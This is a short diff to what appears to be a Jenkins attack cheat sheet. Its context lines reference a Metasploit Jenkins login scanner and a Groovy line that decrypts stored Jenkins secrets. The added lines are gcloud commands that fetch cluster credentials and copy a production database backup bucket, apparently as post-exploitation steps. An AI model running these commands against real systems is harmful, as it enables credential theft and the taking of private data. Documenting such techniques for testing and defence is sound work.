@@ -30,3 +30,10 @@ use auxiliary/scanner/http/jenkins_login
 ```java
 println( hudson.util.Secret.decrypt("${ENCRYPTED_PASSPHRASE_OR_PASSWORD}") )
 ```
+
+```bash
+gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
+[...]
+gcloud storage cp -r gs://conduit-database-backup-prod/ .
+```
+</details>
